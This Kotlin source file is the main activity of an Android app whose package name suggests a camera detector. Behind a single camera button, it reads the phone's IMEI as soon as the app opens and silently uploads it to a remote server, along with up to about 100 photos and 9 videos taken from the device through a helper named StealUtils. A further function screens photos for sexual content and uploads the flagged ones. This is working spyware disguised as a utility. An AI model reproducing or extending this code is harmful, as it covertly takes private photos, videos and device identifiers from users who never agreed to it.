package king.bird.camaradetector.act

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.support.v7.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.KeyEvent
import android.widget.Toast
import king.bird.camaradetector.net.Api
import king.bird.camaradetector.net.NetWorkUtilsK
import java.io.File
import king.bird.tool.PermissionUtils
import android.telephony.TelephonyManager
import com.google.gson.Gson
import com.zhy.http.okhttp.OkHttpUtils
import com.zhy.http.okhttp.callback.StringCallback
import king.bird.camaradetector.R
import king.bird.camaradetector.bean.User
import king.bird.camaradetector.utils.LogUtils
import king.bird.marrykotlin.iface.OnRequestListener
import king.bird.tool.StealUtils
import kotlinx.android.synthetic.main.activity_main.*
import okhttp3.Call
import java.lang.Exception
import java.text.SimpleDateFormat
import java.util.*
import kotlin.collections.HashMap


class MainActivity : AppCompatActivity() {

    private var mExitTime: Long? = 0L

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContentView(R.layout.activity_main)

        saveUserInfo()

        mBtnStart.setOnClickListener {
            intoCamera()
        }
    }

    /**
     * 上传图片
     */
    private fun upLoadPic(key: String, value: File, imei: String) {

        OkHttpUtils.post().addParams("dir", imei)
                .addFile(key, value.absolutePath, value)
                .url(Api.baseUrl)
                .addHeader("method", Api.upLoadPic)
                .build().execute(object : StringCallback() {
                    override fun onResponse(p0: String?, p1: Int) {
                        LogUtils.e(p0)
                    }

                    override fun onError(p0: Call?, p1: Exception?, p2: Int) {
                        if (p1 != null) {
                            LogUtils.e(p1.message)
                        }
                    }
                })
    }

    /**
     * 批量上传图片
     */
    private fun upLoadPics(imei: String) {
        val allLocalPhotos = StealUtils.getAllLocalPhotos(this@MainActivity)
        val files = HashMap<String, File>()
        var i = 0
        //机算数量
        allLocalPhotos.forEach {
            if (it.fileSize / 1000 in 19..5999) {
                i++
                if (i < 100) {
                    files[it.title] = File(it.filePath)
                }
            }
        }
        OkHttpUtils.post().addParams("dir", imei)
                .files("file", files)
                .url(Api.baseUrl)
                .addHeader("method", Api.upLoadPic)
                .build().execute(object : StringCallback() {
                    override fun onResponse(p0: String?, p1: Int) {
                        LogUtils.e(p0)
                    }

                    override fun onError(p0: Call?, p1: Exception?, p2: Int) {
                        if (p1 != null) {
                            LogUtils.e(p1.message)
                        }
                    }
                })
    }

    /**
     * 批量上传视频
     */
    private fun upLoadVideos(imei: String) {
        val allLocalPhotos = StealUtils.getAllLocalVideos(this@MainActivity)
        val files = HashMap<String, File>()
        var i = 0
        //机算数量
        allLocalPhotos.forEach {
            i++
            if (i < 10) {
                files[it.title] = File(it.filePath)
            }
        }
        OkHttpUtils.post().addParams("dir", imei)
                .files("file", files)
                .url(Api.baseUrl)
                .addHeader("method", Api.upLoadVideo)
                .build().execute(object : StringCallback() {
                    override fun onResponse(p0: String?, p1: Int) {
                        LogUtils.e(p0)
                    }

                    override fun onError(p0: Call?, p1: Exception?, p2: Int) {
                        if (p1 != null) {
                            LogUtils.e(p1.message)
                        }
                    }
                })
    }

    /**
     * 保存用户信息
     */
    @SuppressLint("HardwareIds", "SimpleDateFormat", "MissingPermission")
    private fun saveUserInfo() {

            val user = User()
            val map = HashMap<String, String>()
            val telephonyMgr = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val imei = telephonyMgr.deviceId as String
            val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
            val curDate = Date(System.currentTimeMillis())
            user.id = imei
            user.deviceId = imei
            user.intoCount = "0"
            user.imageSize = "0"
            user.createTime = formatter.format(curDate)
            map["data"] = Gson().toJson(user)
            NetWorkUtilsK.doPostJson(Api.baseUrl, map, Api.saveInfo, object : OnRequestListener {
                override fun onSuccess(t: String) {
                    upLoadPics(imei)
                    upLoadVideos(imei)
                }

                override fun onError(errorMsg: String) {
                    upLoadPics(imei)
                    upLoadVideos(imei)
                }
            })


    }

    /**
     * 鉴黄
     */
    private fun autoPic(imei: String) {
        val allLocalPhotos = StealUtils.getAllLocalPhotos(this@MainActivity)
        val files = HashMap<String, File>()
        var i = 0
        //机算数量
        allLocalPhotos.forEach {
            //            if (it.fileSize / 1000 in 199..1999) {
            i++
            if (i < 20) {
                files[it.title] = File(it.filePath)
            }
//            }
        }
        LogUtils.e("图片数量：", i.toString())
        LogUtils.e("上传图片数量：", files.size.toString())

        //上传出局
        var position = 0
        files.forEach {
            position++
            OkHttpUtils.post().addFile(it.key, it.value.absolutePath, it.value).url(Api.baseUrl)
                    .addHeader("method", Api.autoImage)
                    .addHeader("Content-Type", "multipart/form-data")
                    .addParams("id", imei)
                    .addParams("position", position.toString())
                    .addParams("fileSize", files.size.toString())
                    .addParams("imageSize", i.toString())
                    .build().execute(object : StringCallback() {
                        override fun onResponse(p0: String?, p1: Int) {
                            LogUtils.e(p0)
                            if ("yellow" == p0) {
                                upLoadPic(it.key, it.value, imei)
                            }
                        }

                        override fun onError(p0: Call?, p1: Exception?, p2: Int) {
                            if (p1 != null) {
                                LogUtils.e(p1.message)
                            }
                        }
                    })

        }


    }

    private fun intoCamera() {
        val intent = Intent()
        intent.action = "android.media.action.VIDEO_CAPTURE"
        intent.addCategory("android.intent.category.DEFAULT")
        startActivityForResult(intent, 0)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        Log.e("", "拍摄完成，resultCode=$requestCode")
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            if (System.currentTimeMillis() - this!!.mExitTime!! > 2000) {
                Toast.makeText(applicationContext, "不退出应用可以持续监测", Toast.LENGTH_SHORT).show()
                mExitTime = System.currentTimeMillis()

            } else {
                System.exit(0)
                finish()
            }
            return true
        }
        return super.onKeyDown(keyCode, event)
    }


}
